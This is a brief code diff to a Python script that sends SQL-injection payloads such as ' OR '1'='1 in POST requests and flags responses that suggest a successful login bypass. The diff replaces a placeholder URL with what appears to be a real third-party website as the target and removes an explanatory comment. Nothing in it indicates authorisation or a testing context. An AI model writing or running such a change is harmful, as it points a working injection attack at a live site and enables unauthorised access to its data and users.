@@ -1,6 +1,6 @@
 import requests
 
-TARGET_URL = 'http://example.com/vulnerable-page.php'
+TARGET_URL = 'http://www.laskarnafa.com'
 
 payloads = [
     "' OR '1'='1",
@@ -14,7 +14,6 @@ def attempt_sql_injection(url):
         data = {'query': payload}
         response = requests.post(url, data=data)
         
-        # Check if the payload might have succeeded
         if "Welcome back" in response.text or "username" in response.text:
             print(f"Potential vulnerability found with payload: {payload}")
             return True
